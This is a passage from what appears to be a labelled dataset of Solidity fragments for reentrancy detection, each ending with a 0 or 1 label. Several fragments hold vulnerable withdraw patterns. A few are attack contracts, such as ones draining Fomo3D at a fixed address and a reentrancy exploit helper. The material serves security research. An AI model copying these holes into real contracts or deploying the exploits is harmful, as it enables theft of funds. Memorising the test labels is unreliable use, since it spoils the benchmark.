Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1765 5629.sol
5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
1766 3270.sol
3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
1767 16925.sol
16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
1768 21390.sol
21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
1769 2387.sol
2387.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1770 14458.sol
14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
1771 30101.sol
30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1772 9600.sol
9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1773 40425.sol
40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)())  {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount))   {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0)   {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_))   {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)())  {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount))  {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)())      {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_)  {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
1774 1710.sol
1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance));    }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
1775 40038.sol
40038.sol
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
1776 9221.sol
9221.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1777 3255.sol
3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_)
private
returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)
private
returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
1778 39705.sol
39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1779 39664.sol
39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1780 12182.sol
12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1781 13952.sol
13952.sol
function removeBankroll(uint _amount, string _callbackFn)
public
returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits()
public
returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund)
private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt)
private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
1782 21886.sol
21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
1783 39973.sol
39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
1784 10715.sol
10715.sol
function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract AtripToken is ERC827Token {
using SafeMath for uint256;
string public name = "Atrip Token";
string public symbol = "APK";
uint public decimals = 18;
address public wallet = 0x0;
1
---------------------------------
1785 30460.sol
30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
1786 4679.sol
4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256("forwardEther()") ) ) );
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
0
---------------------------------
1787 40340.sol
40340.sol
function withdrawFunds(uint amount) {
if (accountIDs[msg.sender]>0) {
if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) {
accounts[accountIDs[msg.sender]].capital -= int(amount);
msg.sender.call.value(amount)();
Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital);
function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) {
if (expired == false) {
if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) {
uint lastAccount = numAccounts;
if (accountID==0) {
accountID = 1;
} else {
lastAccount = accountID;
for (accountID=accountID; accountID<=lastAccount; accountID++) {
if (positions[accounts[accountID].user].expired == false) {
int result = positions[accounts[accountID].user].cash / 1000000000000000000;
for (uint optionID=0; optionID<numOptions; optionID++) {
int moneyness = getMoneyness(options[optionID], uint(value), margin);
result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000;
positions[accounts[accountID].user].expired = true;
uint amountToSend = uint(accounts[accountID].capital + result);
accounts[accountID].capital = 0;
if (positions[accounts[accountID].user].hasPosition==true) {
numPositionsExpired++;
accounts[accountID].user.call.value(amountToSend)();
Expire(msg.sender, accounts[accountID].user);
if (numPositionsExpired == numPositions) {
expired = true;
0
---------------------------------
1788 2387_1.sol
2387_1.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1789 21697_1.sol
21697_1.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1790 24007_1.sol
24007_1.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1791 23803_1.sol
23803_1.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1792 39326_1.sol
39326_1.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1793 30101_1.sol
30101_1.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1794 9221_1.sol
9221_1.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1795 39705_1.sol
39705_1.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1796 39664_1.sol
39664_1.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1797 12182_1.sol
12182_1.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1798 32559_1.sol
32559_1.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1799 35617_1.sol
35617_1.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1800 Reentrance_exploit_1.sol
Reentrance_exploit_1.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
1801 14284.sol
14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1802 40366.sol
40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
1803 2189.sol
2189.sol
function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
1804 27263.sol
27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if ( investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
1805 22247.sol
22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()
public
payable
Put(msg.sender);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1806 37676.sol
37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
1807 33410.sol
33410.sol
function executeTransaction(uint transactionId)  internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1808 4472.sol
4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
1809 37474.sol
37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
1810 33835.sol
33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
1811 1044.sol
1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
1812 17573.sol
17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1813 17215.sol
17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
